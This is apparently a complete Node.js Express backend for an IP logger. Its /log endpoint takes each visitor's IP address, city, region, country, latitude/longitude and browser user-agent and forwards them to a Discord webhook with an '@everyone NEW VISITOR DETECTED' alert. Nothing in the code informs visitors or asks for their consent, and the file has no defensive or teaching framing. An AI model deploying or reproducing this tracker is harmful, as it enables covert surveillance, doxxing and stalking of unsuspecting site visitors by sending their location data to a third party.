require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));
app.use(bodyParser.json());

// Load webhook URL from environment variables
const webhookUrl = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

if (!webhookUrl) {
    console.error("❌ Webhook URL is not defined in environment variables!");
    process.exit(1); // Exit if no webhook URL is provided
}

app.post('/log', async (req, res) => {
    try {
        const { ipData } = req.body;

        const message = {
            content: `@everyone 🚨 **NEW VISITOR DETECTED** 🚨\n\n` +
                `🌐 IP: ${ipData.ip || 'Unknown'}\n` +
                `📍 Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n` +
                `🌍 Coords: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}\n` +
                `🔍 Browser: ${req.headers['user-agent']}\n` +
                `⏰ Time: ${new Date().toISOString()}`
        };

        // Send data to Discord webhook
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        console.log('✅ Data successfully sent to Discord.');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error sending data to Discord:', error);
        res.status(500).json({ success: false, message: 'Failed to log data.' });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
